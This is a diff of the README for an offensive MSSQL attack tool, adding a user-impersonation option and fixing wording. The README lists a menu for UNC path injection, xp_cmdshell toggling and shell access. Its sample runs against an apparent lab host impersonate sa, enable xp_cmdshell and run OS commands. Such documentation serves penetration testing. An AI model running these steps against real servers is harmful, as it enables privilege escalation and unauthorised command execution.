@@ -22,13 +22,14 @@ This tool is intended to carry out well-known attacks on MSSQL database servers.
  -ls                    Linked MSSQLServer Name
  -l                     Attacker IP for UNC Path Injection
  -query                 Custom SQL Query
+ -iuser                 UserName to impersonate
+ -impersonate           ImpersonateSA before execution of any attack
  -impersonateSA         ImpersonateSA before execution of any attack
  -impersonateDBO        ImpersonateDBO before execution of any attack
 [*] MSSQL Attacker - V2 by Rikunj Sindhwad [GUI MODE] [*]
                 HELP MENU
  USAGE: binary.exe GUI DatabaseServer [Optional] DatabaseName [Optional] Username [Optional] Password
  USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword
-
 ```
 
 > Attack  Menu
@@ -38,9 +39,9 @@ This tool is intended to carry out well-known attacks on MSSQL database servers.
                                 [*] MSSQL Attacker V2 by Rikunj Sindhwad [*]
 
 [1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
-[4] ImpersonateSA                        [5] Impersonate DBO             [6] Toggle xp_cmdshell
+[4] Impersonate                          [5] Impersonate DBO             [6] Toggle xp_cmdshell
 [7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
-[10] ToggleLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell  [12] Custom SQL Query
+[10] Toggle LinkedServer xp_cmdshell     [11] LinkedServer xp_cmdshell  [12] Custom SQL Query
 [0] Exit Program
 
 [INPUT] Enter Value:
@@ -64,7 +65,7 @@ Z:\>MSSQLAttacker.exe cli -a
 ```
 
 
-#### Check Lognin user and sysadmin privilege.
+#### Check login user and sysadmin privileges.
 The sysadmin privilege enables extra functionalities which could be used to gain access over database server through OS command execution.
 
 - [ ] CLI
@@ -85,7 +86,7 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -u sa -p lab -a getinfo
 [-] User is NOT a member of sysadmin role
 ```
 
-#### Check If Any user can be impersonated.
+#### Check if any user can be impersonated.
  Impersonation privilege across users will often allows to perform privileged tasks over the DB server such as enabling xp_cmdshell and many more.
 
 - [ ] CLI
@@ -296,6 +297,14 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami
 [-] xp_cmdshell enable fail! || Missing Privileges
 # with impersonateSA
 Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami -impersonateSA
+[+] Auth success!
+[+] Impersonatable Users: sa
+[+] Impersonation Success
+[+] xp_cmdshell enabled
+corp1\sqlsvc
+
+# with impersonate
+Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami -impersonate -iuser sa
 [+] Auth success!
 [+] Impersonatable Users: sa
 [+] Impersonation Success
